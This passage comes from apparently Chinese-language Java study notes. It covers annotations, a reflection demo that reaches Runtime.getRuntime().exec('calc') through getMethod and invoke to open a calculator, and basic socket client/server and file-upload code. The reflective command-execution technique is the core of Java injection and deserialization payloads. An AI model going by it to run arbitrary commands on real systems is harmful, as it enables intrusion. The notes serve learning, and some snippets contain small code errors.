keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span>String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span>String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义类的注解</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>ElementType<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span>RetentionPolicy<span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>@<span class="token keyword">interface</span> <span class="token class-name">ClassAnnotation</span><span class="token punctuation">{</span>    String <span class="token function">tableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义属性的注解</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>ElementType<span class="token punctuation">.</span>FIELD<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span>RetentionPolicy<span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>@<span class="token keyword">interface</span> <span class="token class-name">FieldAnnotation</span><span class="token punctuation">{</span>    String <span class="token function">column</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String <span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210826194040801.png" alt="image-20210826194040801"></p><h1 id="通过反射执行方法实例演示"><a href="#通过反射执行方法实例演示" class="headerlink" title="通过反射执行方法实例演示"></a>通过反射执行方法实例演示</h1><p><strong>通过反射在电脑上弹出计算器</strong></p><p>已知</p><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过此方法可以弹出计算器</p><p>反射：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//第一步 所有反射的基本-获取class类</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> runtime <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后看看Runtime类</p><p><img src="image-20210903194952959.png" alt="image-20210903194952959"></p><p><strong>看源码可以得知，我们无法直接<code>new Runtime()</code>,但在类的最开始，程序就实例化了<code>Runtmie</code>类并教给了变量<code>currentRuntime</code></strong></p><p>当调用<code>getRuntime</code>方法时，返回该实例化</p><h2 id="静态类的概念"><a href="#静态类的概念" class="headerlink" title="静态类的概念"></a><strong>静态类的概念</strong></h2><blockquote><p>类是无法直接定义静态属性的</p><p>所以想写一个静态类，就只能在类中写一个静态的属性调用它本身，然后用一个静态的方法输出</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span>  <span class="token keyword">class</span> 测试 <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> 测试 cs <span class="token operator">=</span> <span class="token keyword">new</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> 测试 <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> cs<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者只定义一个静态方法</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span>  <span class="token keyword">class</span> 测试 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> 测试 <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样这个类就成了静态类</p></blockquote><h2 id="为什么Runtime不能new"><a href="#为什么Runtime不能new" class="headerlink" title="为什么Runtime不能new"></a><strong>为什么Runtime不能new</strong></h2><blockquote><p>理论上即使是静态类，同样是可以实例化，Runtmie不能被实例化的原因很简单</p><p><strong>它的构造器是<code>private</code>属性</strong></p><p><img src="image-20210903201421389.png" alt="image-20210903201421389"></p><p>而默认的构造器不是默认属性便是<code>public</code></p><p><strong>外部类实例化时无法完成对构造器的调用，所以不能new[构造器是在调用类时必须调用的方法]</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span>  <span class="token keyword">class</span> 测试 <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> 测试 cs <span class="token operator">=</span> <span class="token keyword">new</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> 测试 <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> cs<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> 测试<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210903201614468.png" alt="image-20210903201614468"></p></blockquote><p>了解了以上两点，就可以继续分析</p><p>所以最开始的示例应该如此理解</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Runtime<span class="token punctuation">.</span>exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但<code>Runtime</code>是个构造器为<code>private</code>的静态类，所以只能先得到它的实例化，然后调用exec</p><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*得到实例化*/</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="反射-1"><a href="#反射-1" class="headerlink" title="反射"></a>反射</h2><h3 id="接着继续第二步，得到exec方法"><a href="#接着继续第二步，得到exec方法" class="headerlink" title="接着继续第二步，得到exec方法"></a>接着继续第二步，得到exec方法</h3><pre class="line-numbers language-java"><code class="language-java">Method exec <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果构造器不为<code>private</code>，接下来应该是这样</p><pre class="line-numbers language-java"><code class="language-java">Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> constructor <span class="token operator">=</span> cs<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 得到该类的构造器</span>测试 o <span class="token operator">=</span> <span class="token punctuation">(</span>测试<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 通过得到的构造器将类实例化</span>o<span class="token punctuation">.</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 调用方法</span><span class="token comment" spellcheck="true">/*因为是无参构造，所以也可以这样*/</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cs <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"测试"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>测试 o <span class="token operator">=</span> <span class="token punctuation">(</span>测试<span class="token punctuation">)</span> cs<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 直接通过class对象将类实例化</span>o<span class="token punctuation">.</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但<code>private</code>属性的构造器明显不能如此调用</p><p>所以我们要得到<code>Runtime</code>的实例化</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//第一步 所有反射的基本-获取class类</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> runtime <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第二步，得到Runtime的实例化和exec方法</span>Method getRuntime <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 得到getRuntmie方法</span>Object invoke <span class="token operator">=</span> getRuntime<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化getRuntime方法</span>Method exec <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 得到exec方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>invoke</code>对得到的方法初始化，就可以得到该方法的返回值，初始化的思路同<code>python</code>的<code>SSTI</code></p><p><strong>invoke需要传入调用底层方法的对象，对于<code>getRuntmie</code>，底层方法就是获取到的class</strong></p><p><strong>得到的返回值即为<code>new Runtmie()</code></strong></p><h3 id="然后第三步，以得到的返回值为底层对象，调用非静态的exec"><a href="#然后第三步，以得到的返回值为底层对象，调用非静态的exec" class="headerlink" title="然后第三步，以得到的返回值为底层对象，调用非静态的exec"></a>然后第三步，以得到的返回值为底层对象，调用非静态的exec</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//第一步 所有反射的基本-获取class类</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> runtime <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第二步，得到Runtime的实例化和exec方法</span>Method getRuntime <span class="token operator">=</span> runtime<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 得到getRuntmie方法</span>Object invoke <span class="token operator">=</span> getRuntime<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化getRuntime方法</span>Method exec <span class="token operator">=</span> runtime<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 得到exec方法</span><span class="token comment" spellcheck="true">//第三步，调用exec</span>exec<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>invoke<span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>此时invoke调用的底层是不是没有<code>new Runtime</code>和外部调用的底层了，而是<code>Runtmie</code>内部已经实例化的底层，所以可以执行exec方法</strong></p><p><img src="image-20210903205121769.png" alt="image-20210903205121769"></p><p><strong>成功通过反射弹出了计算器</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java网络编程</title>
      <link href="/2021/08/04/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2021/08/04/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>笔记内容学自链接视频：<code>https://www.bilibili.com/video/BV1LJ411z7vY</code></strong></p><h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>java将网络编程所用到的方法都写在了<code>java.net</code>包中</p><p><code>Inetaddress</code>类用于处理与ip地址相关的内容</p><p><strong><code>InetAddress</code>类没有构造方法，所以不能直接new出p一个对象；i</strong></p><p>可以通过<code>InetAddress</code>类的静态方法获得<code>InetAddress</code>的对象；</p><p>如：</p><blockquote><p><code>InetAddress.getLocalHost();</code></p><p><code>InetAddress.getByName(&quot;&quot;);</code></p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inetaddress</span>类 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InetAddress get <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getLocalHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210807165806510.png" alt="image-20210807165806510"></p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p><img src="image-20210807171331988.png" alt="image-20210807171331988"></p><p><strong><code>InetSocketAddress</code>类用于对端口进行操作</strong></p><p><code>InetSocketAddress</code>类可以直接<code>new</code></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetSocketAddress<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 端口 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        InetSocketAddress inetSocketAddress <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>inetSocketAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210808150751052.png" alt="image-20210808150751052"></p><h1 id="网络编程实战演练"><a href="#网络编程实战演练" class="headerlink" title="网络编程实战演练"></a>网络编程实战演练</h1><p><strong>注意：<code>java</code>中客户端和服务端的访问过程，都是通关==管道流==来实现的</strong></p><p>​            <strong>比如发送和接收用IO流（<code>InputStream,OutputStream</code>），上传文件用文件流(<code>FileInputStream,FileOutputStream</code>)等等</strong></p><h2 id="模拟实现客户端与服务端通"><a href="#模拟实现客户端与服务端通" class="headerlink" title="模拟实现客户端与服务端通"></a>模拟实现客户端与服务端通</h2><h3 id="Server"><a href="#Server" class="headerlink" title="Server:"></a><code>Server:</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ServerSocket<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>Socket<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//需要一个地址</span>            ServerSocket serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//等待客户连接</span>            Socket accept <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//获取客户端发送的内容</span>            InputStream inputStream <span class="token operator">=</span> accept<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//字节数组输出流</span>            ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置缓冲区</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//输出</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭流</span>            byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            accept<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            serverSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Client"><a href="#Client" class="headerlink" title="Client:"></a><code>Client:</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>Socket<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//连接地址</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InetAddress get1 <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">9999</span><span class="token punctuation">;</span>            Socket socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>get1<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//输出流,获取输出</span>            OutputStream os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入输出</span>            os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"我是Atmujie"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//关闭流</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210814163650527.png" alt="image-20210814163650527"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="Server："><a href="#Server：" class="headerlink" title="Server："></a><code>Server：</code></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 网络编程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ServerSocket<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>Socket<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 文件上传Server <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//创建地址</span>            ServerSocket serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//等待客户发送</span>            Socket accept <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//接收流</span>            InputStream inputStream <span class="token operator">=</span> accept<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//读取流</span>            FileOutputStream files <span class="token 